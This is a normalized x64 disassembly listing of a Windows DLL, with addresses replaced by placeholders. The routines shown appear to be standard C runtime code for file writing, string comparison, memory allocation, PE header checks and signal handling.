jb r-xdata
mov eax r12d
sub eax r13d
cmp eax r14d
jae r-xdata
mov r15d [ rsp + 0x44 ]
lea rsi [ rbp + 0x620 ]
xor ecx ecx
jmp r-xdata
cmp sil 0x1
je r-xdata
mov r12d [ rsp + 0x4c ]
mov r8d 0x1
mov rdx rbx
mov rax r14
sub rax rbx
add rax r13
cmp rax 0x1
jle r-xdata
lea rcx [ rsp + 0x40 ]
call sub_18000e820
cmp eax 0xffffffff
je r-xdata
mov edi r12d
mov r8d 0xd
sub edi r13d
cmp edi r14d
jb r-xdata
mov rax [ rsp + 0x50 ]
and [ rsp + 0x20 ] 0x0
movsxd rcx esi
lea rdx [ rbp + rcx + 0x620 ]
mov r8d r15d
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
mov rax [ rsp + 0x60 ]
lea r9 [ rsp + 0x48 ]
mov rcx [ rax + rcx ]
sub r8d esi
call [ WriteFile@IAT ]
test eax eax
je r-xdata
jmp r-xdata
mov r15d [ rsp + 0x44 ]
lea rsi [ rbp + 0x620 ]
xor ecx ecx
jmp r-xdata
movzx ecx [ rsp + 0x40 ]
call sub_18000e64c
cmp ax [ rsp + 0x40 ]
jne r-xdata
cmp sil 0x2
jne r-xdata
mov ebx [ rsp + 0x4c ]
jmp r-xdata
and [ rsp + 0x38 ] 0x0
and [ rsp + 0x30 ] 0x0
mov ecx [ rsp + 0x5c ]
lea rax [ rsp + 0x60 ]
lea r8 [ rsp + 0x40 ]
mov r9d 0x1
xor edx edx
mov [ rsp + 0x28 ] 0x5
inc rbx
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
mov r12d eax
test eax eax
je r-xdata
mov al [ rbx ]
lea rdx [ rw-data ]
inc edi
mov rcx [ rdx + r12 * 8 ]
mov [ r15 + rcx + 0x4c ] al
mov rax [ rdx + r12 * 8 ]
mov [ r15 + rax + 0x50 ] 0x1
lea rcx [ rsp + 0x40 ]
mov r8d 0x2
mov rdx rbx
call sub_18000e820
cmp eax 0xffffffff
je r-xdata
lea rcx [ rsp + 0x70 ]
xor edx edx
cmp r15d esi
jg r-xdata
add edi 0x2
test r12d r12d
je r-xdata
mov r12 [ rsp + 0x50 ]
mov rcx [ rsp + 0x50 ]
and [ rsp + 0x20 ] 0x0
lea rax [ rw-data ]
mov rcx [ rax + rcx * 8 ]
lea r9 [ rsp + 0x58 ]
lea rdx [ rsp + 0x60 ]
mov rcx [ r15 + rcx ]
mov r8d r12d
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc rbx
jmp r-xdata
mov r12d 0xd
mov ecx r12d
mov [ rsp + 0x40 ] r12w
call sub_18000e64c
cmp ax [ rsp + 0x40 ]
jne r-xdata
jmp r-xdata
mov edi ebx
sub edi r13d
add edi [ rsp + 0x44 ]
cmp [ rsp + 0x58 ] r12d
jl r-xdata
inc edi
inc [ rsp + 0x44 ]
cmp [ rsp + 0x4c ] 0x0
mov r12 [ rsp + 0x50 ]
je r-xdata
mov eax ebx
sub eax r13d
cmp eax r14d
jae r-xdata
and [ rsp + 0x20 ] 0x0
lea rax [ rw-data ]
mov [ rsp + 0x60 ] 0xd
mov rcx [ rax + r12 * 8 ]
lea r9 [ rsp + 0x58 ]
lea rdx [ rsp + 0x60 ]
mov rcx [ r15 + rcx ]
mov r8d 0x1
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ rsp + 0x58 ] 0x1
jl r-xdata
inc [ rsp + 0x44 ]
inc edi
jmp r-xdata
sub_18000cd20
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x20
mov esi r8d
mov r12 rdx
movsxd rdi ecx
cmp edi 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_180006f04
and [ rax ] 0x0
call sub_180006ee4
mov [ rax ] 0x9
jmp r-xdata
call sub_180006f04
and [ rax ] 0x0
call sub_180006ee4
mov [ rax ] 0x9
call sub_180008e08
cmp edi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov rbx rdi
mov r13 rdi
sar r13 0x5
lea r14 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rax [ r14 + r13 * 8 ]
movsx ecx [ rax + rbx + 0x8 ]
and ecx 0x1
je r-xdata
mov ecx edi
call sub_18000e4a4
nop
mov rax [ r14 + r13 * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
call sub_180006ee4
mov [ rax ] 0x9
call sub_180006f04
and [ rax ] 0x0
or ebx 0xffffffff
mov r8d esi
mov rdx r12
mov ecx edi
call sub_18000c5c0
mov ebx eax
jmp r-xdata
mov rbx [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov ecx edi
call sub_18000e54c
mov eax ebx
jmp r-xdata
sub_18000ce00
push rbx
sub rsp 0x20
inc [ rw-data ]
mov rbx rcx
mov ecx 0x1000
call sub_18000a460
mov [ rbx + 0x10 ] rax
test rax rax
je r-xdata
or [ rbx + 0x18 ] 0x4
lea rax [ rbx + 0x20 ]
mov [ rbx + 0x24 ] 0x2
mov [ rbx + 0x10 ] rax
or [ rbx + 0x18 ] 0x8
mov [ rbx + 0x24 ] 0x1000
jmp r-xdata
mov rax [ rbx + 0x10 ]
and [ rbx + 0x8 ] 0x0
mov [ rbx ] rax
add rsp 0x20
pop rbx
retn
sub_18000ce54
sub rsp 0x28
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_180006ee4
mov [ rax ] 0x9
jmp r-xdata
call sub_180006ee4
mov [ rax ] 0x9
call sub_180008e08
cmp ecx [ rw-data ]
jae r-xdata
xor eax eax
movsxd rcx ecx
lea rdx [ rw-data ]
mov rax rcx
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
mov rax [ rdx + rax * 8 ]
movsx eax [ rax + rcx + 0x8 ]
and eax 0x40
jmp r-xdata
add rsp 0x28
retn
sub_18000ceb4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ rw-data ]
mov edi 0xa
mov rcx [ rbx ]
call [ EncodePointer@IAT ]
mov [ rbx ] rax
add rbx 0x8
dec rdi
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_18000cf04
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x20 ] r9w
push rbp
push rsi
push rdi
mov rbp rsp
sub rsp 0x60
mov rdi r8
mov rsi rdx
mov rbx rcx
test rdx rdx
jne r-xdata
test rcx rcx
je r-xdata
test r8 r8
je r-xdata
cmp r8 0x7fffffff
jbe r-xdata
or [ rcx ] 0xffffffff
test rcx rcx
je r-xdata
mov rdx [ rbp + 0x40 ]
lea rcx [ rbp - 0x20 ]
call sub_18000643c
mov r11 [ rbp - 0x20 ]
cmp [ r11 + 0x14 ] 0x0
jne r-xdata
call sub_180006ee4
mov ebx 0x16
mov [ rax ] ebx
call sub_180008e08
xor eax eax
jmp r-xdata
and [ rcx ] edx
and [ rbp + 0x28 ] 0x0
mov ecx [ r11 + 0x4 ]
lea rax [ rbp + 0x28 ]
mov [ rsp + 0x38 ] rax
and [ rsp + 0x30 ] 0x0
lea r8 [ rbp + 0x38 ]
mov r9d 0x1
xor edx edx
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rsi
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
movzx eax [ rbp + 0x38 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
mov rbx [ rsp + 0x80 ]
add rsp 0x60
pop rdi
pop rsi
pop rbp
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ rbp + 0x28 ] 0x0
jne r-xdata
test rsi rsi
je r-xdata
test rsi rsi
je r-xdata
call sub_180006ee4
mov [ rax ] 0x2a
call sub_180006ee4
cmp [ rbp - 0x8 ] 0x0
mov eax [ rax ]
je r-xdata
test rsi rsi
je r-xdata
test rbx rbx
je r-xdata
test rbx rbx
je r-xdata
test rdi rdi
jne r-xdata
test rdi rdi
je r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
call sub_180006ee4
mov ebx 0x22
mov [ rax ] ebx
call sub_180008e08
cmp [ rbp - 0x8 ] 0x0
je r-xdata
test rdi rdi
je r-xdata
cmp [ rbp - 0x8 ] 0x0
je r-xdata
mov [ rbx ] eax
jmp r-xdata
mov [ rbx ] 0x1
mov [ rsi ] al
call sub_180006ee4
lea ebx [ rdi + 0x22 ]
mov [ rax ] ebx
call sub_180008e08
cmp [ rbp - 0x8 ] dil
je r-xdata
mov r8 rdi
xor edx edx
mov rcx rsi
call sub_180008e40
mov eax ebx
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
mov r8 rdi
xor edx edx
mov rcx rsi
call sub_180008e40
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_18000d0dc
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x40
lea rbp [ rsp + 0x30 ]
mov [ rbp + 0x40 ] rbx
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x50 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp ] rax
mov esi [ rbp + 0x68 ]
xor edi edi
mov r13d r9d
mov r14 r8
mov r15d edx
test esi esi
jne r-xdata
neg [ rbp + 0x70 ]
mov ecx esi
mov [ rsp + 0x28 ] edi
sbb edx edx
mov [ rsp + 0x20 ] rdi
and edx 0x8
inc edx
call [ MultiByteToWideChar@IAT ]
movsxd r12 eax
test eax eax
jne r-xdata
mov rax [ rcx ]
mov esi [ rax + 0x4 ]
jle r-xdata
xor eax eax
jmp r-xdata
mov rbx rdi
mov rax 0x7ffffffffffffff0
cmp r12 rax
ja r-xdata
mov rcx [ rbp ]
xor rcx rbp
call sub_180006220
mov rbx [ rbp + 0x40 ]
mov rsi [ rbp + 0x48 ]
mov rdi [ rbp + 0x50 ]
lea rsp [ rbp + 0x10 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov r8 r12
xor edx edx
mov rcx rbx
add r8 r8
call sub_180008e40
mov r9d r13d
mov r8 r14
mov edx 0x1
mov ecx esi
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea rcx [ r12 + r12 + 0x10 ]
cmp rcx 0x400
ja r-xdata
lea rcx [ rbx - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov r9 [ rbp + 0x60 ]
mov r8d eax
mov rdx rbx
mov ecx r15d
call [ GetStringTypeW@IAT ]
mov edi eax
call sub_180006de4
mov rbx rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
mov eax edi
call sub_180006da4
test rbx rbx
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_18000a210
sub rsp rax
lea rbx [ rsp + 0x30 ]
test rbx rbx
je r-xdata
mov rax 0xffffffffffffff0
mov [ rbx ] 0xcccc
jmp r-xdata
add rbx 0x10
jmp r-xdata
sub_18000d23c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x60
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x40 ]
mov ebx r9d
mov rdi r8
call sub_18000643c
mov r11d [ rsp + 0xa8 ]
mov eax [ rsp + 0x98 ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x30 ] r11d
mov [ rsp + 0x28 ] eax
mov rax [ rsp + 0x90 ]
mov r9d ebx
mov r8 rdi
mov edx esi
mov [ rsp + 0x20 ] rax
call sub_18000d0dc
cmp [ rsp + 0x58 ] 0x0
je r-xdata
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x60
pop rdi
retn
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_18000d2bc
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x8 ]
call sub_180006da4
mov rcx [ rbx + 0x10 ]
call sub_180006da4
mov rcx [ rbx + 0x18 ]
call sub_180006da4
mov rcx [ rbx + 0x20 ]
call sub_180006da4
mov rcx [ rbx + 0x28 ]
call sub_180006da4
mov rcx [ rbx + 0x30 ]
call sub_180006da4
mov rcx [ rbx ]
call sub_180006da4
mov rcx [ rbx + 0x40 ]
call sub_180006da4
mov rcx [ rbx + 0x48 ]
call sub_180006da4
mov rcx [ rbx + 0x50 ]
call sub_180006da4
mov rcx [ rbx + 0x58 ]
call sub_180006da4
mov rcx [ rbx + 0x60 ]
call sub_180006da4
mov rcx [ rbx + 0x68 ]
call sub_180006da4
mov rcx [ rbx + 0x38 ]
call sub_180006da4
mov rcx [ rbx + 0x70 ]
call sub_180006da4
mov rcx [ rbx + 0x78 ]
call sub_180006da4
mov rcx [ rbx + 0x80 ]
call sub_180006da4
mov rcx [ rbx + 0x88 ]
call sub_180006da4
mov rcx [ rbx + 0x90 ]
call sub_180006da4
mov rcx [ rbx + 0x98 ]
call sub_180006da4
mov rcx [ rbx + 0xa0 ]
call sub_180006da4
mov rcx [ rbx + 0xa8 ]
call sub_180006da4
mov rcx [ rbx + 0xb0 ]
call sub_180006da4
mov rcx [ rbx + 0xb8 ]
call sub_180006da4
mov rcx [ rbx + 0xc0 ]
call sub_180006da4
mov rcx [ rbx + 0xc8 ]
call sub_180006da4
mov rcx [ rbx + 0xd0 ]
call sub_180006da4
mov rcx [ rbx + 0xd8 ]
call sub_180006da4
mov rcx [ rbx + 0xe0 ]
call sub_180006da4
mov rcx [ rbx + 0xe8 ]
call sub_180006da4
mov rcx [ rbx + 0xf0 ]
call sub_180006da4
mov rcx [ rbx + 0xf8 ]
call sub_180006da4
mov rcx [ rbx + 0x100 ]
call sub_180006da4
mov rcx [ rbx + 0x108 ]
call sub_180006da4
mov rcx [ rbx + 0x110 ]
call sub_180006da4
mov rcx [ rbx + 0x118 ]
call sub_180006da4
mov rcx [ rbx + 0x120 ]
call sub_180006da4
mov rcx [ rbx + 0x128 ]
call sub_180006da4
mov rcx [ rbx + 0x130 ]
call sub_180006da4
mov rcx [ rbx + 0x138 ]
call sub_180006da4
mov rcx [ rbx + 0x140 ]
call sub_180006da4
mov rcx [ rbx + 0x148 ]
call sub_180006da4
mov rcx [ rbx + 0x150 ]
call sub_180006da4
mov rcx [ rbx + 0x170 ]
call sub_180006da4
mov rcx [ rbx + 0x178 ]
call sub_180006da4
mov rcx [ rbx + 0x180 ]
call sub_180006da4
mov rcx [ rbx + 0x188 ]
call sub_180006da4
mov rcx [ rbx + 0x190 ]
call sub_180006da4
mov rcx [ rbx + 0x198 ]
call sub_180006da4
mov rcx [ rbx + 0x168 ]
call sub_180006da4
mov rcx [ rbx + 0x1a8 ]
call sub_180006da4
mov rcx [ rbx + 0x1b0 ]
call sub_180006da4
mov rcx [ rbx + 0x1b8 ]
call sub_180006da4
mov rcx [ rbx + 0x1c0 ]
call sub_180006da4
mov rcx [ rbx + 0x1c8 ]
call sub_180006da4
mov rcx [ rbx + 0x1d0 ]
call sub_180006da4
mov rcx [ rbx + 0x1a0 ]
call sub_180006da4
mov rcx [ rbx + 0x1d8 ]
call sub_180006da4
mov rcx [ rbx + 0x1e0 ]
call sub_180006da4
mov rcx [ rbx + 0x1e8 ]
call sub_180006da4
mov rcx [ rbx + 0x1f0 ]
call sub_180006da4
mov rcx [ rbx + 0x1f8 ]
call sub_180006da4
mov rcx [ rbx + 0x200 ]
call sub_180006da4
mov rcx [ rbx + 0x208 ]
call sub_180006da4
mov rcx [ rbx + 0x210 ]
call sub_180006da4
mov rcx [ rbx + 0x218 ]
call sub_180006da4
mov rcx [ rbx + 0x220 ]
call sub_180006da4
mov rcx [ rbx + 0x228 ]
call sub_180006da4
mov rcx [ rbx + 0x230 ]
call sub_180006da4
mov rcx [ rbx + 0x238 ]
call sub_180006da4
mov rcx [ rbx + 0x240 ]
call sub_180006da4
mov rcx [ rbx + 0x248 ]
call sub_180006da4
mov rcx [ rbx + 0x250 ]
call sub_180006da4
mov rcx [ rbx + 0x258 ]
call sub_180006da4
mov rcx [ rbx + 0x260 ]
call sub_180006da4
mov rcx [ rbx + 0x268 ]
call sub_180006da4
mov rcx [ rbx + 0x270 ]
call sub_180006da4
mov rcx [ rbx + 0x278 ]
call sub_180006da4
mov rcx [ rbx + 0x280 ]
call sub_180006da4
mov rcx [ rbx + 0x288 ]
call sub_180006da4
mov rcx [ rbx + 0x290 ]
call sub_180006da4
mov rcx [ rbx + 0x298 ]
call sub_180006da4
mov rcx [ rbx + 0x2a0 ]
call sub_180006da4
mov rcx [ rbx + 0x2a8 ]
call sub_180006da4
mov rcx [ rbx + 0x2b0 ]
call sub_180006da4
mov rcx [ rbx + 0x2b8 ]
call sub_180006da4
add rsp 0x20
pop rbx
sub_18000d6ac
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
cmp rcx [ rw-data ]
je r-xdata
mov rcx [ rbx + 0x8 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180006da4
mov rcx [ rbx + 0x10 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180006da4
mov rcx [ rbx + 0x58 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180006da4
mov rcx [ rbx + 0x60 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180006da4
add rsp 0x20
pop rbx
call sub_180006da4
sub_18000d718
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x18 ]
cmp rcx [ rw-data ]
je r-xdata
mov rcx [ rbx + 0x20 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180006da4
mov rcx [ rbx + 0x28 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180006da4
mov rcx [ rbx + 0x30 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180006da4
mov rcx [ rbx + 0x38 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180006da4
mov rcx [ rbx + 0x40 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180006da4
mov rcx [ rbx + 0x48 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180006da4
mov rcx [ rbx + 0x68 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180006da4
mov rcx [ rbx + 0x70 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180006da4
mov rcx [ rbx + 0x78 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180006da4
mov rcx [ rbx + 0x80 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180006da4
mov rcx [ rbx + 0x88 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180006da4
mov rcx [ rbx + 0x90 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180006da4
add rsp 0x20
pop rbx
call sub_180006da4
sub_18000d840
sub rdx rcx
cmp r8 0x8
jb r-xdata
test r8 r8
je r-xdata
test cl 0x7
je r-xdata
xor rax rax
retn
mov al [ rcx ]
cmp al [ rdx + rcx ]
jne r-xdata
mov r9 r8
shr r9 0x3
jne r-xdata
nop
sbb eax eax
sbb eax 0xffffffff
retn
inc rcx
dec r8
jne r-xdata
shr r9 0x2
je r-xdata
inc rcx
dec r8
test cl 0x7
jne r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
mov rax [ rcx ]
cmp rax [ rdx + rcx ]
jne r-xdata
mov al [ rcx ]
cmp al [ rdx + rcx ]
jne r-xdata
mov rax [ rcx ]
cmp rax [ rdx + rcx ]
jne r-xdata
mov rcx [ rcx + rdx ]
bswap rax
bswap rcx
cmp rax rcx
sbb eax eax
sbb eax 0xffffffff
retn
mov rax [ rcx + 0x8 ]
cmp rax [ rdx + rcx + 0x8 ]
jne r-xdata
add rcx 0x8
dec r9
jne r-xdata
add rcx 0x8
mov rax [ rcx + 0x10 ]
cmp rax [ rdx + rcx + 0x10 ]
jne r-xdata
and r8 0x7
jmp r-xdata
add rcx 0x8
mov rax [ rcx + 0x18 ]
cmp rax [ rdx + rcx + 0x18 ]
jne r-xdata
add rcx 0x8
add rcx 0x20
dec r9
jne r-xdata
and r8 0x1f
sub_18000d920
test r8 r8
je r-xdata
xor rax rax
retn
sub rdx rcx
mov r9 rdx
mov r11 0x8101010101010100
test cl 0x7
je r-xdata
lea rdx [ rcx + r9 ]
and dx 0xfff
cmp dx 0xff8
ja r-xdata
mov al [ rcx ]
mov dl [ rcx + r9 ]
inc rcx
cmp al dl
jne r-xdata
mov rax [ rcx ]
mov rdx [ rcx + r9 ]
cmp rax rdx
jne r-xdata
sbb rax rax
sbb rax 0xffffffffffffffff
retn
dec r8
je r-xdata
add rcx 0x8
sub r8 0x8
mov r10 0x7efefefefefefeff
jbe r-xdata
test al al
je r-xdata
xor rax 0xffffffffffffffff
add r10 rdx
xor rax r10
test r11 rax
je r-xdata
test rcx 0x7
jne r-xdata
jmp r-xdata
test dl dl
je r-xdata
xor rax rax
retn
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr edx 0x10
test dl dl
je r-xdata
test dh dh
jne r-xdata
sub_18000d9e0
mov rax rcx
mov ecx 0x5a4d
cmp [ rax ] cx
je r-xdata
movsxd rcx [ rax + 0x3c ]
add rcx rax
xor eax eax
cmp [ rcx ] 0x4550
jne r-xdata
xor eax eax
retn
retn
mov edx 0x20b
cmp [ rcx + 0x18 ] dx
sete al
sub_18000da10
movsxd r8 [ rcx + 0x3c ]
xor r9d r9d
mov r10 rdx
add r8 rcx
movzx eax [ r8 + 0x14 ]
movzx r11d [ r8 + 0x6 ]
lea rcx [ rax + r8 + 0x18 ]
test r11d r11d
je r-xdata
xor eax eax
retn
mov edx [ rcx + 0xc ]
cmp r10 rdx
jb r-xdata
inc r9d
add rcx 0x28
cmp r9d r11d
jb r-xdata
mov eax [ rcx + 0x8 ]
add eax edx
cmp r10 rax
jb r-xdata
mov rax rcx
retn
sub_18000da60
sub rsp 0x28
mov r8 rcx
lea r9 [ __dos_header ]
mov rcx r9
call sub_18000d9e0
test eax eax
je r-xdata
add rsp 0x28
retn
sub r8 r9
mov rdx r8
mov rcx r9
call sub_18000da10
test rax rax
je r-xdata
mov eax [ rax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
jmp r-xdata
sub_18000daa4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx r8
mov rdi rdx
test rcx rcx
je r-xdata
imul rdi rcx
mov eax 0x1
test rdi rdi
cmove rdi rax
xor edx edx
lea rax [ rdx - 0x20 ]
div rcx
cmp rax rdi
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov rcx [ rw-data ]
lea edx [ rax + 0x8 ]
mov r8 rdi
call [ HeapAlloc@IAT ]
test rax rax
jne r-xdata
call sub_180006ee4
mov [ rax ] 0xc
test rbx rbx
je r-xdata
mov rcx rdi
call sub_180007dd8
test eax eax
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov [ rbx ] 0xc
xor eax eax
cmp rdi 0xffffffffffffffe0
ja r-xdata
test rbx rbx
je r-xdata
xor eax eax
jmp r-xdata
mov [ rbx ] 0xc
jmp r-xdata
sub_18000dbdc
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov ebx ecx
xor edi edi
mov [ rsp + 0x60 ] edi
xor esi esi
mov edx ecx
sub edx 0x2
je r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
sub edx 0x2
je r-xdata
test r13 r13
jne r-xdata
xor eax eax
jmp r-xdata
call sub_1800079c8
mov rsi rax
test rax rax
jne r-xdata
sub edx 0x2
je r-xdata
test edi edi
je r-xdata
lea ecx [ r13 + 0x3 ]
call sub_18000a94c
int3
mov rbx [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rdx [ rax + 0xa0 ]
mov rcx rdx
movsxd r8 [ r--data ]
or eax 0xffffffff
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
jmp r-xdata
sub edx 0x2
je r-xdata
cmp ebx 0x8
je r-xdata
xor ecx ecx
call sub_18000c3c4
nop
mov rax r8
shl rax 0x4
add rax rdx
cmp rcx rax
jae r-xdata
add rcx 0x10
mov rax r8
shl rax 0x4
add rax rdx
cmp rcx rax
jb r-xdata
mov edi 0x1
mov [ rsp + 0x60 ] edi
call [ DecodePointer@IAT ]
mov r13 rax
sub edx 0x3
je r-xdata
mov r15 [ rsi + 0xa8 ]
mov [ rsp + 0x28 ] r15
and [ rsi + 0xa8 ] 0x0
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
xor ecx ecx
cmp [ rcx + 0x4 ] ebx
je r-xdata
cmp [ rcx + 0x4 ] ebx
je r-xdata
sub edx 0x4
je r-xdata
mov r14d [ rsp + 0x60 ]
mov r14d [ rsi + 0xb0 ]
mov [ rsi + 0xb0 ] 0x8c
jmp r-xdata
cmp ebx 0x4
je r-xdata
cmp r13 0x1
jne r-xdata
lea r12 [ rcx + 0x8 ]
mov r13 [ r12 ]
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
jmp r-xdata
sub edx 0x6
je r-xdata
call EncodePointer
mov [ r12 ] rax
mov ecx [ r--data ]
mov edx ecx
mov [ rsp + 0x20 ] ecx
cmp ebx 0x8
jne r-xdata
mov r15 [ rsp + 0x28 ]
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
jmp r-xdata
dec edx
je r-xdata
mov edi 0x8
cmp ebx edi
jne r-xdata
xor ecx ecx
call sub_18000c2c4
test edi edi
je r-xdata
movsxd rcx edx
add rcx rcx
mov rax [ rsi + 0xa0 ]
and [ rax + rcx * 8 + 0x8 ] 0x0
inc edx
mov [ rsp + 0x20 ] edx
mov ecx [ r--data ]
jmp r-xdata
call sub_180006ee4
mov [ rax ] 0x16
call sub_180008e08
jmp r-xdata
mov ecx ebx
call r13
mov edx [ rsi + 0xb0 ]
mov ecx edi
call r13
jmp r-xdata
mov eax [ r--data ]
add ecx eax
cmp edx ecx
jge r-xdata
mov [ rsi + 0xa8 ] r15
cmp ebx edi
jne r-xdata
cmp ebx 0xb
je r-xdata
cmp ebx edi
je r-xdata
mov [ rsi + 0xb0 ] r14d
jmp r-xdata
cmp ebx 0x4
jne r-xdata
sub_18000de20
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x40
mov ebx edx
mov rdx rcx
lea rcx [ rsp + 0x20 ]
mov edi r9d
mov esi r8d
call sub_18000643c
mov rax [ rsp + 0x28 ]
movzx r11d bl
test [ r11 + rax + 0x1d ] dil
jne r-xdata
mov eax 0x1
test esi esi
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x40
pop rdi
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
xor eax eax
mov rax [ rsp + 0x20 ]
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + r11 * 2 ]
and eax esi
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_18000deb0
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x50
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x48 ] rax
mov ebp r8d
mov r14 rdx
mov r13 rcx
call EncodePointer
xor ebx ebx
cmp [ rw-data ] rbx
mov rdi rax
jne r-xdata
mov rax [ rw-data ]
lea rcx [ r--data ]
call [ LoadLibraryW@IAT ]
mov rsi rax
test rax rax
je r-xdata
mov rcx [ rw-data ]
cmp rcx rdi
je r-xdata
cmp r11 rdi
je r-xdata
xor eax eax
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
mov rcx rax
call [ DecodePointer@IAT ]
mov rcx [ rw-data ]
mov rsi rax
call [ DecodePointer@IAT ]
mov r12 rax
test rsi rsi
je r-xdata
mov rcx rax
call [ EncodePointer@IAT ]
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
mov r11 rax
mov [ rw-data ] rax
test rax rax
je r-xdata
mov r9d ebp
mov r8 r14
mov rdx r13
mov rcx rbx
call rax
jmp r-xdata
call rax
mov rbx rax
test rax rax
je r-xdata
test rax rax
je r-xdata
mov rax [ rw-data ]
jmp r-xdata
lea rdx [ r--data ]
mov rcx rsi
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
jmp r-xdata
mov rcx [ rsp + 0x48 ]
xor rcx rsp
call sub_180006220
add rsp 0x50
pop r14
